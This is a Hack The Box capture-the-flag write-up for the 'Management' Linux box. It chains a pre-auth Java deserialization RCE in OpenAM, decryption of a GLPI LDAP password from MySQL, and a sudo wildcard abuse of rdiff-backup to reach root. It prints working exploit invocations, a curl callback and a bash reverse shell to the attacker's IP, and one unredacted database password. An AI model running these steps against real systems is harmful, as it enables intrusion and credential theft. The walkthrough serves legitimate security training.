# Management — Hack The Box Writeup

## Box Info

| Property | Value |
|----------|-------|
| OS | Linux |
| IP | 10.129.244.176 |
| Difficulty | Medium |
| User Flag | `[REDACTED]` |
| Root Flag | `[REDACTED]` |

## Attack Chain Summary

1. **Foothold**: CVE-2026-33439 — Pre-auth RCE via `jato.clientSession` deserialization in OpenAM 16.0.5
2. **User (openam → owen)**: Decrypt GLPI LDAP bind password from MySQL, pivot via password reuse
3. **Root (owen → root)**: Sudo wildcard abuse in `rdiff-backup --server` to override `--restrict-path` and `--restrict-mode`

---

## Enumeration

### Nmap

```bash
nmap -sC -sV 10.129.244.176
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 9.6p1 Ubuntu |
| 80 | HTTP | nginx 1.24.0 (Ubuntu) |
| 443 | HTTPS | nginx 1.24.0 (Ubuntu) |

### Virtual Hosts

The main site on port 80/443 redirected to `management.htb`. Adding it to `/etc/hosts` and fingerprinting revealed:

- **management.htb** — Static SPA (AES-GCM encrypted JavaScript, no backend)
- **sso.management.htb** — OpenAM 16.0.5 (3A Systems LLC community edition) running on Apache Tomcat 10.1.52
- **backup.management.htb** — Static backup site (served from `/opt/backup`)

```
10.129.244.176 management.htb sso.management.htb backup.management.htb
```

### OpenAM Fingerprinting

The OpenAM version was identified as **16.0.5** via the XUI page's `urlArgs` cache-busting parameter. The LDAP realm was `dc=management,dc=htb`, using the DataStore authentication module.

### Directory Scanning

Running `dirsearch` against `https://sso.management.htb/openam/` revealed:

| Path | Description |
|------|-------------|
| `/openam/ui/PWResetUserValidation` | Password reset form (pre-auth) |
| `/openam/ui/PWResetQuestion` | Password reset question page (pre-auth) |
| `/openam/api/` | Swagger API Explorer |

### User Enumeration

The password reset form at `/openam/ui/PWResetUserValidation` accepts a User ID and searches LDAP by `uid`. Valid users return a different response than invalid ones. A Python script was used to enumerate:

```python
# Submit uid to PWResetUserValidation, check if response differs
# Valid users proceed to the security question step
# Invalid users show the form again with no change
```

| Username | Status |
|----------|--------|
| amadmin | Valid (OpenAM super admin) |
| demo | Valid |
| dsameuser | Valid (internal service account) |
| anonymous | Valid |

---

## Foothold — CVE-2026-33439 (OpenAM Pre-Auth RCE)

### Vulnerability Overview

CVE-2026-33439 is a **pre-authentication remote code execution** vulnerability in OpenIdentityPlatform OpenAM versions prior to 16.0.6. It is a bypass of the CVE-2021-35464 fix.

After CVE-2021-35464, OpenAM applied a `WhitelistObjectInputStream` filter to the `jato.pageSession` parameter. However, the same fix was **never extended** to the `jato.clientSession` parameter. The deserialization path is:

```
ClientSession.deserializeAttributes()
  → Encoder.deserialize()
    → ApplicationObjectInputStream.readObject()  // NO class whitelist
```

### Gadget Chain

The exploit uses classes bundled in the OpenAM WAR — no external tools like ysoserial are needed:

```
PriorityQueue.readObject()                              [java.util - JDK]
  → heapify() → siftDown() → comparator.compare()
    → Column$ColumnComparator.compare(o1, o2)           [openam-core-16.0.5.jar]
      → Column.getTable().isSortedAscending()            [click-nodeps-2.3.0.jar]
      → Column.getProperty(o1)
        → PropertyUtils.getObjectPropertyValue(          [openam-core-16.0.5.jar]
            o1, "outputProperties")
          → TemplatesImpl.getOutputProperties()          [xalan-2.7.3.jar]
            → defineTransletClasses()
              → TransletClassLoader.defineClass(_bytecodes)
                → EvilTranslet.<clinit>()                [attacker bytecode]
                  → Runtime.getRuntime().exec(cmd)
```

### Exploitation

The public PoC was cloned from GitHub. It includes all required JARs and a Python exploit script:

```bash
git clone https://github.com/TheMalwareGuardian/CVE-2026-33439.git /tmp/CVE-2026-33439
```

**Critical fix**: The Kali attack box had JDK 23 installed, but the target runs JDK 21. Java class files compiled with JDK 23 (class file version 67) cannot be loaded by JDK 21 (max class file version 65). The exploit was patched to cross-compile with `--release 21`:

```python
# In Exploit_CVE_2026_33439.py, changed javac calls:
# Before:
["javac", "-cp", classpath, java_path]
# After:
["javac", "--release", "21", "-cp", classpath, java_path]
```

### RCE Verification

```bash
# Start HTTP listener
python3 -m http.server 9999 --bind 10.10.16.35

# Fire exploit with curl callback
python3 Exploit_CVE_2026_33439.py \
  --url https://sso.management.htb/openam \
  --command "curl http://10.10.16.35:9999/rce_confirmed" \
  --jars "/tmp/CVE-2026-33439/02 Exploit/Jars" \
  --endpoint /ui/PWResetUserValidation
```

The HTTP listener received the callback from `10.129.244.176`, confirming RCE.

### Reverse Shell

```bash
# Attacker: start listener
nc -lvnp 4444

# Fire exploit with reverse shell payload
python3 Exploit_CVE_2026_33439.py \
  --url https://sso.management.htb/openam \
  --command "bash -i >& /dev/tcp/10.10.16.35/4444 0>&1" \
  --jars "/tmp/CVE-2026-33439/02 Exploit/Jars" \
  --endpoint /ui/PWResetUserValidation
```

Shell received as `openam` service account.

### Shell Stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash
```

---

## Lateral Movement — openam → owen

### Discovery: GLPI Installation

Enumerating `/opt/` revealed **GLPI** (IT asset management platform) installed at `/opt/glpi`, owned by `www-data`:

```
/opt/backup      — www-data — rdiff-backup repository
/opt/backups     — root     — system backups (inaccessible)
/opt/glpi        — www-data — GLPI web application
/opt/openam      — openam   — OpenAM config
/opt/openam-tomcat — openam — Tomcat instance
```

### GLPI Database Credentials

GLPI's database configuration was world-readable:

```bash
cat /opt/glpi/config/config_db.php
```

```php
class DB extends DBmysql {
   public $dbhost = '127.0.0.1';
   public $dbuser = 'glpi';
   public $dbpassword = '[REDACTED]';
   public $dbdefault = 'glpidb';
}
```

### LDAP Bind Password in GLPI

GLPI was configured to authenticate against the OpenAM embedded LDAP directory. The LDAP configuration in MySQL contained an encrypted bind password:

```bash
mysql -u glpi -p'8rhu0L6Pw4Y7' -h 127.0.0.1 glpidb \
  -e "SELECT rootdn, rootdn_passwd FROM glpi_authldaps;"
```

| Field | Value |
|-------|-------|
| rootdn | `cn=svc-glpi,ou=services,dc=management,dc=htb` |
| rootdn_passwd | `[REDACTED]` |

### Decrypting the GLPI Password

GLPI encrypts sensitive fields using `sodium_crypto_aead_xchacha20poly1305_ietf` with a key stored in `/opt/glpi/config/glpicrypt.key`.

The critical detail (found by reading GLPI's `GLPIKey.php` source at line 505) is that GLPI uses the **nonce as both the nonce AND the additional data (AD)** parameter:

```php
// GLPI's actual decrypt call (GLPIKey.php:505)
$plaintext = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(
    $ciphertext,
    $nonce,    // AD = nonce (not empty string!)
    $nonce,    // nonce
    $key
);
```

Decryption on the target:

```bash
php -r '
$key = file_get_contents("/opt/glpi/config/glpicrypt.key");
$encrypted = base64_decode("[REDACTED]");
$nonce = mb_substr($encrypted, 0, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES, "8bit");
$ciphertext = mb_substr($encrypted, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES, null, "8bit");
$plaintext = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($ciphertext, $nonce, $nonce, $key);
echo $plaintext . "\n";
'
```

**Decrypted password**: `[REDACTED]`

### Password Reuse

The `svc-glpi` LDAP bind password was reused by `owen` as their system password:

```bash
su owen
# Password: [REDACTED]
```

**User flag**: `[REDACTED]`

---

## Privilege Escalation — owen → root

### Sudo Enumeration

```bash
owen@management:~$ sudo -l
User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```

Owen can run `rdiff-backup` in server mode as root, supposedly restricted to read-only access of `/opt/backup`. The critical vulnerability is the **trailing wildcard `*`**, which allows appending arbitrary additional arguments.

### Flag Override Attack

In `rdiff-backup`, when the same flag is passed multiple times, the **last value wins**. Since the sudo rule allows any arguments after the fixed prefix, we can append `--restrict-path /` and `--restrict-mode read-write` to override the intended restrictions:

```bash
rdiff-backup --remote-schema 'sudo /usr/bin/rdiff-backup \
  --server \
  --restrict-path /opt/backup \
  --restrict-mode read-only \
  --restrict-path / \
  --restrict-mode read-write \
  --tempdir /tmp/%s' \
  --list-increments dummy::/opt/backup
```

**Breakdown of the technique:**

1. `--remote-schema` tells the rdiff-backup client how to spawn the server process
2. The command matches the sudo rule: starts with the required prefix, wildcard matches the extra flags
3. `--restrict-path /` overrides `/opt/backup` → server can access the entire filesystem
4. `--restrict-mode read-write` overrides `read-only` → server can read and write
5. `--tempdir /tmp/%s` absorbs the `%s` placeholder (replaced with the dummy hostname by rdiff-backup)
6. `dummy::` provides the required hostname for the connection string

### Reading the Root Flag

With unrestricted root-level filesystem access, backup `/root/` to a local directory:

```bash
mkdir -p /tmp/dummy  # Required for --tempdir

rdiff-backup --remote-schema 'sudo /usr/bin/rdiff-backup \
  --server \
  --restrict-path /opt/backup \
  --restrict-mode read-only \
  --restrict-path / \
  --restrict-mode read-write \
  --tempdir /tmp/%s' \
  dummy::/root/ /tmp/root_backup

cat /tmp/root_backup/root.txt
```

**Root flag**: `[REDACTED]`

---

## Key Takeaways

1. **Patch management matters**: OpenAM 16.0.5 was patched for CVE-2021-35464 (`jato.pageSession`) but missed the same vulnerability in `jato.clientSession` — a classic incomplete fix that led to CVE-2026-33439.

2. **Cross-compilation for exploit dev**: When the attacker JDK differs from the target, Java exploits that embed compiled bytecode (like `TemplatesImpl` chains) must use `--release` to target the correct class file version.

3. **Application-layer credential harvesting**: GLPI stored an LDAP bind password encrypted with sodium. Reading the actual decryption source code (not just guessing the crypto parameters) was essential — GLPI's non-standard use of nonce-as-AD broke naive decryption attempts.

4. **Sudo wildcard abuse**: A trailing `*` in a sudoers command definition allows an attacker to append flags that override earlier restrictions. Tools like `rdiff-backup` that accept repeated flags (last-wins semantics) are especially vulnerable. The fix is to never use wildcards in sudoers entries, or to use `--` to terminate flag parsing before the wildcard.
